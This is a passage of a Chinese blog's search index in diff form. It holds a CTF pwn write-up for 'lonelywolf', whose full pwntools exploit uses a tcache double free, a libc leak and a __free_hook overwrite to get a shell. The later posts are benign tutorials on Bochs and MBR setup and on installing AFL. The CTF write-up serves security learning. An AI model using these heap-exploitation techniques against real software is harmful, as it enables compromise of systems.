&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span> * <span class="number">0x600</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-lonelywolf"><a href="#1-2-lonelywolf" class="headerlink" title="1.2 lonelywolf"></a>1.2 lonelywolf</h2><blockquote>
+<p>自己做的时候把key域直接清空，在tcache上进行double free，泄露出当前的堆块地址，使用循环将tcache填满，堆块进入unsorted bin，但是没有指向main_arena+96的位置(实在好笑)，就是不会利用tcache管理结构进行泄露libc</p>
+</blockquote>
+<p>破坏掉key域，利用show功能leak出当前堆块的地址，根据此地址推算出tcache管理结构的地址，申请tcache里的堆块，修改fd指针为tcache管理结构的地址，进而申请到tcache管理结构这个堆块，将其标志位进行修改后进行释放，这个堆块进入unsorted bin就可以泄露main_arena+96的地址，进而算得libc地址；之后就是再次修改标志位，修改堆块的fd指针，使其指向<code>__free_hook - 0x8</code>，就能申请到<code>__free_hook - 0x8</code>的堆块进行hook</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./lonelywolf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)  </span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">lauch_gdb()</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># beat key</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak_chunk = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">head = leak_chunk - <span class="number">0x250</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(head) + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0xff000000</span>)) <span class="comment">#change flag</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">4</span>) <span class="comment">#change flag</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook - <span class="number">0x8</span>) * <span class="number">2</span>)</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwnable.tw</title>
+    <url>/Pwnable-tw/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>操作系统真象还原 Part1</title>
+    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F-Part1/</url>
+    <content><![CDATA[<h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1 环境搭建"></a>1 环境搭建</h1><p>笔者电脑环境：</p>
+<ul>
+<li>Vmware 16</li>
+<li>Ubuntu 18.04</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="1-1-bochs"><a href="#1-1-bochs" class="headerlink" title="1.1 bochs"></a>1.1 bochs</h2><h3 id="1-1-1-安装"><a href="#1-1-1-安装" class="headerlink" title="1.1.1 安装"></a>1.1.1 安装</h3><p>在物理机下载bochs2.6.9版本<a href="https://sourceforge.net/projects/bochs/files/bochs/2.6.9/">Bochs x86 PC emulator - Browse /bochs/2.6.9 at SourceForge.net</a>，复制到Ubuntu虚拟机，进行解压：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf bochs-2.6.9.tar.gz</span><br><span class="line"></span><br><span class="line">cd bochs-2.6.9</span><br></pre></td></tr></table></figure>
+
+<p>安装依赖环境：</p>
+<blockquote>
+<p>aptitude包管理器处理环境依赖问题优秀，自动解决相关环境依赖问题</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install aptitude</span><br><span class="line"></span><br><span class="line">sudo aptitude install build-essential</span><br><span class="line"></span><br><span class="line">sudo aptitude install xorg-dev</span><br><span class="line"></span><br><span class="line">sudo aptitude install bison</span><br><span class="line"></span><br><span class="line">sudo aptitude install libgtk2.0-dev</span><br><span class="line"></span><br><span class="line">sudo aptitude install gcc-multilib</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-1-1-编译本身调试版本"><a href="#1-1-1-1-编译本身调试版本" class="headerlink" title="1.1.1.1 编译本身调试版本"></a>1.1.1.1 编译本身调试版本</h4><p>使用bochs自身debug，终端按顺序键入下面命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure \</span><br><span class="line"></span><br><span class="line">--prefix=/home/jimp/localdebug/bochs \</span><br><span class="line"></span><br><span class="line">--enable-debugger \</span><br><span class="line"></span><br><span class="line">--enable-disasm \</span><br><span class="line"></span><br><span class="line">--enable-iodebug \</span><br><span class="line"></span><br><span class="line">--enable-x86-debugger \</span><br><span class="line"></span><br><span class="line">--with-x \</span><br><span class="line"></span><br><span class="line">--with-x11</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>make install</code>出现以下错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x.cc:42:10: fatal error: X11/extensions/Xrandr.h: No such file or directory</span><br><span class="line"> #include &lt;X11/extensions/Xrandr.h&gt;</span><br><span class="line">          ^~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">Makefile:114: recipe for target &#x27;x.o&#x27; failed</span><br><span class="line">make[1]: *** [x.o] Error 1</span><br><span class="line">make[1]: Leaving directory &#x27;/home/jimp/bochs-2.6.9/gui&#x27;</span><br><span class="line">Makefile:360: recipe for target &#x27;gui/libgui.a&#x27; failed</span><br><span class="line">make: *** [gui/libgui.a] Error 2</span><br></pre></td></tr></table></figure>
+
+<p>解决方案如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude install libxrandr-dev</span><br></pre></td></tr></table></figure>
+
+<p>再次执行<code>make install</code>即可成功安装自身调试版本</p>
+<h4 id="1-1-1-2-编译gdb调试版本"><a href="#1-1-1-2-编译gdb调试版本" class="headerlink" title="1.1.1.2 编译gdb调试版本"></a>1.1.1.2 编译gdb调试版本</h4><p>使用gdb进行debug，终端按顺序键入下面命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure \</span><br><span class="line"></span><br><span class="line">--prefix=/home/jimp/gdbdebug/bochs \</span><br><span class="line"></span><br><span class="line">--enable-gdb-stub \</span><br><span class="line"></span><br><span class="line">--enable-disasm \</span><br><span class="line"></span><br><span class="line">--enable-iodebug \</span><br><span class="line"></span><br><span class="line">--enable-x86-debugger \</span><br><span class="line"></span><br><span class="line">--with-x \</span><br><span class="line"></span><br><span class="line">--with-x11</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>make install</code>即可成功安装gdb调试版本</p>
+<h3 id="1-1-2-配置"><a href="#1-1-2-配置" class="headerlink" title="1.1.2 配置"></a>1.1.2 配置</h3><p>在自身调试版本的bochs安装目录下(我的是/home/jimp/localdebug/bochs/bin/)创建配置文件bochsrc.disk，文件内容如下(gdb调试版本去除gdbstub所在行的注释即可)：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">############################################### </span><br><span class="line"># Configuration file for Bochs </span><br><span class="line">###############################################</span><br><span class="line"># 第一步，首先设置 Bochs 在运行过程中能够使用的内存，本例为 32MB。 </span><br><span class="line"># 关键字为：megs </span><br><span class="line"> </span><br><span class="line">megs: 32 </span><br><span class="line"> </span><br><span class="line"># 第二步，设置对应真实机器的 BIOS 和 VGA BIOS。 </span><br><span class="line"># 对应两个关键字为：romimage 和 vgaromimage </span><br><span class="line"> </span><br><span class="line">romimage: file=/home/jimp/localdebug/bochs/share/bochs/BIOS-bochs-latest </span><br><span class="line">vgaromimage: file=/home/jimp/localdebug/bochs/share/bochs/VGABIOS-lgpl-latest </span><br><span class="line"> </span><br><span class="line"># 第三步，设置 Bochs 所使用的磁盘，软盘的关键字为 floppy。 </span><br><span class="line"># 若只有一个软盘，则使用 floppya 即可，若有多个，则为 floppya，floppyb… </span><br><span class="line">#floppya: 1_44=a.img, status=inserted </span><br><span class="line"> </span><br><span class="line"># 第四步，选择启动盘符。 </span><br><span class="line">#boot: floppy #默认从软盘启动，将其注释 </span><br><span class="line">boot: disk  #改为从硬盘启动。我们的任何代码都将直接写在硬盘上，所以不会再有读写软盘的操作。 </span><br><span class="line"> </span><br><span class="line"># 第五步，设置日志文件的输出。 </span><br><span class="line">log: bochs.out </span><br><span class="line"> </span><br><span class="line"># 第六步，开启或关闭某些功能。 </span><br><span class="line"># 下面是关闭鼠标，并打开键盘。 </span><br><span class="line">mouse: enabled=0 </span><br><span class="line">keyboard: keymap=/home/jimp/localdebug/bochs/share/bochs/keymaps/x11-pc-us.map </span><br><span class="line"> </span><br><span class="line"># 硬盘设置 </span><br><span class="line">ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14 </span><br><span class="line"> </span><br><span class="line"># 下面的是增加的 bochs 对 gdb 的支持，这样 gdb 便可以远程连接到此机器的 1234 端口调试了 </span><br><span class="line"># gdbstub: enabled=1, port=1234, text_base=0, data_base=0, bss_base=0 </span><br><span class="line"> </span><br><span class="line">###################  配置文件结束  #####################</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-1-3-运行"><a href="#1-1-3-运行" class="headerlink" title="1.1.3 运行"></a>1.1.3 运行</h3><p>终端下进入到bin(/home/jimp/localdebug/bochs/bin/)目录下执行命令<code>./bochs</code>,在第一个红色方框处数字2的地方进行回车，在第二个红色方框处键入bochsrc.disk</p>
+<img src="https://pic.imgdb.cn/item/60a381356ae4f77d35848f24.png"  />
+
+<p>终端下键入c，弹出错误提示：No bootable device，提示我们需要创建启动盘，接下来可以使用工具bximage进行创建硬盘，直接按以下步骤创建即可</p>
+<img src="https://pic.imgdb.cn/item/60a384066ae4f77d3599ae52.png"  />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jimp@ubuntu:~/localdebug/bochs/bin$ ./bximage </span><br><span class="line">========================================================================</span><br><span class="line">                                bximage</span><br><span class="line">  Disk Image Creation / Conversion / Resize and Commit Tool for Bochs</span><br><span class="line">         $Id: bximage.cc 13069 2017-02-12 16:51:52Z vruppert $</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">1. Create new floppy or hard disk image</span><br><span class="line">2. Convert hard disk image to other format (mode)</span><br><span class="line">3. Resize hard disk image</span><br><span class="line">4. Commit &#x27;undoable&#x27; redolog to base image</span><br><span class="line">5. Disk image info</span><br><span class="line"></span><br><span class="line">0. Quit</span><br><span class="line"></span><br><span class="line">Please choose one [0] 1</span><br><span class="line"></span><br><span class="line">Create image</span><br><span class="line"></span><br><span class="line">Do you want to create a floppy disk image or a hard disk image?</span><br><span class="line">Please type hd or fd. [hd] hd</span><br><span class="line"></span><br><span class="line">What kind of image should I create?</span><br><span class="line">Please type flat, sparse, growing, vpc or vmware4. [flat] flat</span><br><span class="line"></span><br><span class="line">Enter the hard disk size in megabytes, between 10 and 8257535</span><br><span class="line">[10] 60</span><br><span class="line"></span><br><span class="line">What should be the name of the image?</span><br><span class="line">[c.img] hd60M.img</span><br><span class="line"></span><br><span class="line">Creating hard disk image &#x27;hd60M.img&#x27; with CHS=121/16/63</span><br><span class="line"></span><br><span class="line">The following line should appear in your bochsrc:</span><br><span class="line">  ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat</span><br></pre></td></tr></table></figure>
+
+<p>根据最后提示，在bochsrc.disk文件相应位置添加提示的内容，<code>CHS=121/16/63</code>(CHS为硬盘扇区表示方法)可以展开补充，具体如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 硬盘设置 </span><br><span class="line">ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14 </span><br><span class="line">ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63</span><br></pre></td></tr></table></figure>
+
+<p>使用命令<code>./bochs -f bochsrc.disk</code>启动，-f指示配置文件，最终效果如下：</p>
+<p><img src="https://pic.imgdb.cn/item/60a384766ae4f77d359cd527.png"></p>
+<p>再次报错是因为没有MBR(主引导记录)</p>
+<h2 id="1-2-nasm"><a href="#1-2-nasm" class="headerlink" title="1.2 nasm"></a>1.2 nasm</h2><h3 id="1-2-1-安装"><a href="#1-2-1-安装" class="headerlink" title="1.2.1 安装"></a>1.2.1 安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude install nasm</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-MBR雏形"><a href="#2-MBR雏形" class="headerlink" title="2 MBR雏形"></a>2 MBR雏形</h1><p>提MBR(主引导记录)前，首先得了解BIOS，有人可能熟悉，也可能陌生</p>
+<h2 id="2-1-第一个运行的BIOS"><a href="#2-1-第一个运行的BIOS" class="headerlink" title="2.1 第一个运行的BIOS"></a>2.1 第一个运行的BIOS</h2><p>BIOS全称Base Input &amp; Output System，即基本输入输出系统(开机第一个运行的软件，独立于操作系统，因为操作系统还没有加载)，作用是检测内存、显卡等外设信息，检测通过便做好相关的初始化工作，其中中断向量表IVT的初始化尤为显著。接下来我们就想知道BIOS放置在内存哪个位置，PC指针如何指向BIOS起始地址。在此之前，还需要了解一下实模式。</p>
+<h3 id="2-1-1-实模式"><a href="#2-1-1-实模式" class="headerlink" title="2.1.1 实模式"></a>2.1.1 实模式</h3><p>实模式下，Intel 8086有20条地址线，寻址范围为<code>0~2^20</code>，即1MB空间，对于今天无比庞大的(256T左右)进程空间来说，其是十分渺小的，但是实模式只是进入保护模式的一个引路人，完成其引导工作就退出舞台了。实模式下1MB的内存空间按以下规律进行排布：</p>
+<table>
+<thead>
+<tr>
+<th align="center">起   始</th>
+<th align="center">结  束</th>
+<th align="center">大  小</th>
+<th align="center">用    途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">FFFF0</td>
+<td align="center">FFFFF</td>
+<td align="center">16B</td>
+<td align="center">BIOS 入口地址，此处代码段也属于 BIOS 代码，同样属于顶部的 640KB 字节。为了强调其入口地址才单独贴出来。此处 16 字节的内容是跳转指令 jmp f000:e05b</td>
+</tr>
+<tr>
+<td align="center">F0000</td>
+<td align="center">FFFEF</td>
+<td align="center">64KB-16B</td>
+<td align="center">系统 BIOS 范围是 F0000～FFFFF，共 640KB，为说明入口地址，将最上面的 16字节从此处去掉了，所以此处终止地址是 0XFFFEF</td>
+</tr>
+<tr>
+<td align="center">C8000</td>
+<td align="center">EFFFF</td>
+<td align="center">160KB</td>
+<td align="center">映射硬件适配器的 ROM 或内存映射式 I/O</td>
+</tr>
+<tr>
+<td align="center">C0000</td>
+<td align="center">C7FFF</td>
+<td align="center">32KB</td>
+<td align="center">显示适配器 BIOS</td>
+</tr>
+<tr>
+<td align="center">B8000</td>
+<td align="center">BFFFF</td>
+<td align="center">32KB</td>
+<td align="center">用于文本模式显示适配器</td>
+</tr>
+<tr>
+<td align="center">B0000</td>
+<td align="center">B7FFF</td>
+<td align="center">32KB</td>
+<td align="center">用于黑白显示适配器</td>
+</tr>
+<tr>
+<td align="center">A0000</td>
+<td align="center">AFFFF</td>
+<td align="center">64KB</td>
+<td align="center">用于彩色显示适配器</td>
+</tr>
+<tr>
+<td align="center">9FC00</td>
+<td align="center">9FFFF</td>
+<td align="center">1KB</td>
+<td align="center">EBDA（Extended BIOS Data Area）扩展 BIOS 数据区</td>
+</tr>
+<tr>
+<td align="center">7E00</td>
+<td align="center">9FBFF</td>
+<td align="center">622080B 约608KB</td>
+<td align="center">可用区域</td>
+</tr>
+<tr>
+<td align="center">7C00</td>
+<td align="center">7DFF</td>
+<td align="center">512B</td>
+<td align="center">MBR 被 BIOS 加载到此处，共 512 字节</td>
+</tr>
+<tr>
+<td align="center">500</td>
+<td align="center">7BFF</td>
+<td align="center">30464B 约 30KB</td>
+<td align="center">可用区域</td>
+</tr>
+<tr>
+<td align="center">400</td>
+<td align="center">4FF</td>
+<td align="center">256B</td>
+<td align="center">BIOS Data Area（BIOS 数据区）</td>
+</tr>
+<tr>
+<td align="center">000</td>
+<td align="center">3FF</td>
+<td align="center">1KB</td>
+<td align="center">Interrupt Vector Table（中断向量表）</td>
+</tr>
+</tbody></table>
+<p>从上面的表格就可以的知BIOS存储在0xF0000起始地址处，接下来就是PC指针问题。实模式的寻址是采用<code>段基址+偏移</code>的方式，如<code>CS:IP</code>,得到的地址就是(CS&lt;&lt;4)+IP，因为地址线宽度为16，范围是0~0xFFFF，无法表示20位的地址，于是便采用CS:IP的方式，令CS左移四位即可表示20位的地址。至于每次机器都能寻址到BIOS启动处(0xFFFF0)处，是通过硬件实现的，强制CS为0xF000，IP为0xFFF0。0xFFFF0处到阈值(0xFFFFF)只有16字节，这里只是一个跳转指令，跳到真正的指令执行处，或者说BIOS真正的入口处，好比C/C++程序一个执行的函数是mainCRTStartup这种函数，再跳转到main函数。</p>
+<h2 id="2-2-BIOS接力者MBR"><a href="#2-2-BIOS接力者MBR" class="headerlink" title="2.2 BIOS接力者MBR"></a>2.2 BIOS接力者MBR</h2><p>BIOS结束后执行的第二个程序，同样独立于操作系统，大小为512节，最后两字节必须分别为0x55、0xaa(魔数)，标识其为可执行程序，作用是加载某个程序。编写第一个mbr文件雏形，姑且命名为mbr.S，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;主引导程序</span><br><span class="line">;-------------------------------------------------</span><br><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">; 清屏利用0x06号功能，上卷全部行，则可清屏</span><br><span class="line">; ------------------------------------------------</span><br><span class="line">;INT 0x10   功能号:0x06   功能描述:上卷窗口</span><br><span class="line">;-------------------------------------------------</span><br><span class="line">;输入:</span><br><span class="line">;AH 功能号 = 0x06</span><br><span class="line">;AL = 上卷的行数(如果为0,表示全部)</span><br><span class="line">;BH = 上卷行属性</span><br><span class="line">;(CL,CH) = 窗口左下角的(X,Y)位置</span><br><span class="line">;(DL,DH) = 窗口右下角的(X,Y)位置</span><br><span class="line">;无返回值:</span><br><span class="line">    mov ax, 0x600</span><br><span class="line">    mov bx, 0x700</span><br><span class="line">    mov cx, 0           ; 左上角: (0,0)</span><br><span class="line">    mov dx, 0x184f      ; 右下角: (80,25)</span><br><span class="line">                        ; VGA文本模式中,一行只能容纳80个字符,共25行</span><br><span class="line">                        ; 下标从0开始,所以0x18=24，0x4f=79</span><br><span class="line">    int 0x10            ; int 0x10</span><br><span class="line"></span><br><span class="line">;;;;;;  下面三行代码获取光标位置    ;;;;;;</span><br><span class="line">;.get_cursor获取当前光标位置,在光标位置处打印字符</span><br><span class="line">    mov ah, 3           ; 输入: 3号子功能是获取光标位置,需要存入ah寄存器</span><br><span class="line">    mov bh, 0           ; bh寄存器存储的是待获取光标的页号</span><br><span class="line">    </span><br><span class="line">    int 0x10            ; 输出: ch=光标开始行,c1=光标结束行</span><br><span class="line">                        ; dh=光标所在行号,dl=光标所在列号</span><br><span class="line"></span><br><span class="line">;;;;;;  打印字符串  ;;;;;;</span><br><span class="line">    ;使用0x10中断,子功能号为13号,打印字符串</span><br><span class="line">    mov ax, message </span><br><span class="line">    mov bp, ax          ; es:bp为串首地址，es等于cs</span><br><span class="line">                        ; 开头已为sreg初始化</span><br><span class="line"></span><br><span class="line">    ; 光标位置要用到dx寄存器中的内容,cx中的光标位置可忽略</span><br><span class="line">    mov cx, 0x13        ; cx 为串长度,不包括结束符0的字符个数</span><br><span class="line">    mov ax, 0x1301      ; 子功能号13显示字符及属性,存入ax寄存器</span><br><span class="line">                        ; al设置写字符方式 al=01 : 显示字符串,光标跟随移动</span><br><span class="line">    mov bx, 0x2         ; bh存储要显示的页号,此处是第0页</span><br><span class="line">                        ; bl中是字符属性,属性黑底绿字(b1 = 02h)</span><br><span class="line">    int 0x10            ; 执行BIOS 0x10 中断</span><br><span class="line">;;;;;;  打印字符串结束  ;;;;;;</span><br><span class="line"></span><br><span class="line">    jmp $               ; 使程序悬停在此</span><br><span class="line"></span><br><span class="line">    message db &quot;Jimp System operate&quot;</span><br><span class="line">    times 510-($-$$) db 0</span><br><span class="line">    db 0x55,0xaa</span><br></pre></td></tr></table></figure>
+
+<p>使用nasm工具进行编译mbr.S</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nasm -o mbr.bin mbr.S</span><br></pre></td></tr></table></figure>
+
+<p>使用dd命令将mbr.bin写入我们在上面创建的硬盘的0盘0道1扇区(扇区从1开始计数)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=/home/jimp/c2/a/boot/mbr.bin of=/home/jimp/localdebug/bochs/bin/hd60M.img bs=512 count=1 conv=notrunc</span><br></pre></td></tr></table></figure>
+
+<p>得到成功的回显结果如下(一定是512字节)：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1+0 records in</span><br><span class="line">1+0 records out</span><br><span class="line">512 bytes copied, 0.00083457 s, 613 kB/s</span><br></pre></td></tr></table></figure>
+
+<p>在/home/jimp/localdebug/bochs/bin目录下启动模拟器，直接回车，再按下c是模拟器继续运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bochs -f bochsrc.disk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/60a562bb6ae4f77d35332d46.jpg"></p>
+]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
+      <tags>
+        <tag>Base</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AFL-Fuzz学习之路</title>
+    <url>/AFL-Fuzz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<h1 id="1-安装AFL"><a href="#1-安装AFL" class="headerlink" title="1 安装AFL"></a>1 安装AFL</h1><h2 id="1-1-有源码模式"><a href="#1-1-有源码模式" class="headerlink" title="1.1 有源码模式"></a>1.1 有源码模式</h2><p>前往官网进行下载压缩包，解压，安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line"></span><br><span class="line">tar -zxvf afl-latest.tgz</span><br><span class="line"></span><br><span class="line">cd afl-2.52b</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>安装成功标志如下:</p>
+<p><img src="https://pic.imgdb.cn/item/609f18f9d1a9ae528feb97bf.png"></p>
+<h2 id="1-2-无源码模式"><a href="#1-2-无源码模式" class="headerlink" title="1.2 无源码模式"></a>1.2 无源码模式</h2><blockquote>
+<p>即在上面的基础上安装qemu_mode afl fuzzing，安装了n次都没有成功，差点放弃，最后还是成功了</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd afl-2.52b/qemu_mode</span><br><span class="line"></span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure>
+
+<p>不出意外的话这一步就开始报错，缺什么就是用apt安装什么，除了安装libtool，还得安装libtool-bin，再次执行build_qemu_support.sh脚本依然可以看到以下错误</p>
+<p><img src="https://pic.imgdb.cn/item/609f1b00d1a9ae528f003074.png"></p>
+<p>memfd_create和glibc中的同名函数冲突，需要打patch，在afl-2.52b/qemu_mode/patches/目录下新增一个memfd_create.diff，文件内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c</span><br><span class="line">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span><br><span class="line">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span><br><span class="line">@@ -37,7 +37,7 @@</span><br><span class="line"> #include &lt;sys/syscall.h&gt;</span><br><span class="line"> #include &lt;asm/unistd.h&gt;</span><br><span class="line"> </span><br><span class="line">-static int memfd_create(const char *name, unsigned int flags)</span><br><span class="line">+int memfd_create(const char *name, unsigned int flags)</span><br><span class="line"> &#123;</span><br><span class="line"> #ifdef __NR_memfd_create</span><br><span class="line">     return syscall(__NR_memfd_create, name, flags);</span><br></pre></td></tr></table></figure>
+
+<p>修改build_qemu_support.sh文件内容，加上自己添加的补丁</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;[*] Applying patches...&quot;</span><br><span class="line"></span><br><span class="line">patch -p1 &lt;../patches/elfload.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/cpu-exec.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/syscall.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd_create.diff || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Patching done.&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再次执行build_qemu_support.sh脚本，可以看到以下成功的信息：</p>
+<p><img src="https://pic.imgdb.cn/item/609f1ccfd1a9ae528f118d7b.png"></p>
+]]></content>
+      <categories>
